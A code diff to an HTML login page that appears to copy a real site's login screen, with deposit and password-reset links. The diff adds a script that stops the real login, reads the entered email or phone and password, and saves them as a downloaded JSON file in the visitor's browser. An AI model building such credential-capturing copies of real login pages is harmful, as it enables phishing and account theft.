@@ -80,9 +80,11 @@
 </head>
 <body>
     <div class="sc-7a52a4af-9 iPOPjd" style="right: 0%;">
-        <svg version="1.1" class="logo sc-7a52a4af-10 bxnA-dZ" url="false" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="572.308px" height="158.461px" viewBox="0 0 572.308 158.461" enable-background="new 0 0 572.308 158.461" space="preserve"><g> <!-- Logo SVG paths here --> </g></svg>
+        <svg version="1.1" class="logo sc-7a52a4af-10 bxnA-dZ" url="false" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="572.308px" height="158.461px" viewBox="0 0 572.308 158.461" enable-background="new 0 0 572.308 158.461" space="preserve">
+            <!-- Your SVG paths here -->
+        </svg>
         <div class="form-container">
-            <form>
+            <form id="loginForm">
                 <div class="sc-7a52a4af-4 egCDPX">Login</div>
                 <div style="height: 10px;"></div>
                 <div class="sc-7a52a4af-5 guECte">Please enter your login details below</div>
@@ -93,7 +95,7 @@
                 <div style="height: 10px;"></div>
                 <a href="/login/forgot-password" class="sc-7a52a4af-5 guECte">Forgotten your password?</a>
                 <div class="sc-7a52a4af-5 furOSV">If you did not receive a verification email/PIN click <a href="/register/resend">here to resend</a></div>
-                <button width="100%" radius="5px" type="submit" color="var(--white)" class="sc-9a56f580-4 frloso">LOGIN</button>
+                <button id="loginButton" width="100%" radius="5px" type="submit" color="var(--white)" class="sc-9a56f580-4 frloso">LOGIN</button>
             </form>
         </div>
         <div class="bottom-links">
@@ -102,5 +104,34 @@
             <a href="/account/deposit" class="sc-7a52a4af-8 dkxWVS">Deposit</a>
         </div>
     </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function (event) {
+            event.preventDefault(); // Prevent form submission
+
+            const emailOrPhone = document.querySelector('input[name="email"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+
+            const userData = {
+                emailOrPhone: emailOrPhone,
+                password: password,
+            };
+
+            const jsonData = JSON.stringify(userData);
+
+            const blob = new Blob([jsonData], { type: "application/json" });
+            const url = URL.createObjectURL(blob);
+
+            const downloadLink = document.createElement("a");
+            downloadLink.href = url;
+            downloadLink.download = "data.json";
+            document.body.appendChild(downloadLink);
+
+            downloadLink.click();
+
+            document.body.removeChild(downloadLink);
+            URL.revokeObjectURL(url);
+        });
+    </script>
 </body>
 </html>
